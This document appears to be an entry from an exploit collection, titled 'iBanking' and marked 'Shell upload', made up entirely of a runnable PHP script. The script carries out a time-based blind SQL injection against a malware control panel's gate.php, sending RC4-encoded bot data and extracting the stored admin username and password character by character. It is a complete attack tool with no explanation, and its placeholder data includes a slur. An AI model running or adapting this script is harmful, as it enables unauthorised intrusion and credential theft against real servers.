#### iBanking

```
Type: Shell upload

shell: <?php
    // Panel.zip hash: c49c74a609b24284a0a66fc008c4d8f2
    // Start with PHP CLI (php pwn.php)
    set_time_limit(0);

    // Adjust this :)
    define('SLEEP_TIME', '4');
    define('PAGE_TIME',  4);
    define('URL',        'http://localhost/Phase/');

    echo('attacking ' . URL . PHP_EOL);

    get_string('username');
    get_string('password');

    function get_length($field) {
        $length = 1;

        while (!is_true("' UNION SELECT ALL 1,2,3,4,5,6,7 FROM `settings` WHERE `key` = '" . $field . "' AND (NOT (LENGTH(value)=" . $length . ") OR SLEEP(" . SLEEP_TIME . "))-- ")) {
            ++$length;
        }

        echo($field . ' length: ' . $length . PHP_EOL);

        return $length;
    }

    function get_string($field) {
        $length = get_length($field);
        $str    = '';

        for ($i = 0; $i < $length; ++$i) {
            $str .= chr(get_char($field, $i));
            echo($field . ' : ' . str_pad($str, $length, '*') . PHP_EOL);
        }

        return $str;
    }

    function get_char($field, $id) {
        $binary = '';

        for ($i = 1; $i < 256; $i *= 2) {
            if ($i == 128)
                $binary = '0' . $binary;
            else
                $binary = (is_true("' UNION SELECT ALL 1,2,3,4,5,6,7 FROM `settings` WHERE `key` = '" . $field . "' AND (NOT (ORD(SUBSTR(`value`," . ($id + 1) . ",1)) & " . $i . ") OR SLEEP(" . SLEEP_TIME . "))-- ") ? '1' : '0') . $binary;
        }

        return bindec($binary);
    }

    function is_true($query) {
        $rc4_key   = 'aaaa'; // b d u
        $data      = 'u=tapz&d=faggot&b=lol';
        $encode    = rc4($rc4_key, $data, strlen($data), strlen($rc4_key));
        $encode    = $rc4_key . $encode;
        $injection = urlencode($query);
        $req       = post_request(URL . 'gate.php?i=127.0.0.1' . $injection, $encode);

        return !($req['time'] < PAGE_TIME);
    }

    function post_request($url, $data) {
        $handle = curl_init($url);

        curl_setopt($handle, CURLOPT_HEADER,         false);
        curl_setopt($handle, CURLOPT_USERAGENT,      'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36');
        curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($handle, CURLOPT_POST,           true);
        curl_setopt($handle, CURLOPT_POSTFIELDS,     $data);
        curl_setopt($handle, CURLOPT_TIMEOUT,        30);

        $time = microtime(true);
        $page = curl_exec($handle);
        $time = microtime(true) - $time;

        curl_close($handle);

        return array(
            'page' => $page,
            'time' => $time
        );
    }

    function rc4($pwd, $data, $data_length, $pwd_length){
        $key[] = '';
        $box[] = '';
        $cipher = '';

        for ($i = 0; $i < 256; $i++)
        {
            $key[$i] = ord($pwd[$i % $pwd_length]);
            $box[$i] = $i;
        }
        for ($j = $i = 0; $i < 256; $i++)
        {
            $j = ($j + $box[$i] + $key[$i]) % 256;
            $tmp = $box[$i];
            $box[$i] = $box[$j];
            $box[$j] = $tmp;
        }
        for ($a = $j = $i = 0; $i < $data_length; $i++)
        {
            $a = ($a + 1) % 256;
            $j = ($j + $box[$a]) % 256;
            $tmp = $box[$a];
            $box[$a] = $box[$j];
            $box[$j] = $tmp;
            $k = $box[(($box[$a] + $box[$j]) % 256)];
            $cipher .= chr(ord($data[$i]) ^ $k);
        }
        return $cipher;
    }
```
